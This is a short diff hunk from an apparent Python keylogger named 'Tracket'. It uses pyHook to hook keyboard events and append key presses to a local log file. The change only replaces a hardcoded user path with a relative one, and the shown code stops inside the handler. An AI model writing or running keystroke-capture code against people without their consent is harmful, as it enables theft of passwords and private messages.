@@ -1,12 +1,12 @@
 import pyHook, pythoncom, sys, logging,urllib,os
 import time, pyautogui
 
-file_log = open('C:/Users/Vishnu/PycharmProjects/Tracket/Tracketlog.txt', 'a')
+file_log = open('Tracketlog.txt', 'a')
 
 def OnKeyBoardEvent(event):
 
     try:
-        file_log = open('C:/Users/Vishnu/PycharmProjects/Tracket/Tracketlog.txt', 'a')
+        file_log = open('Tracketlog.txt', 'a')
         key = ' '
         if(event.Ascii!=0):
             if(event.Ascii==32): key = ' '
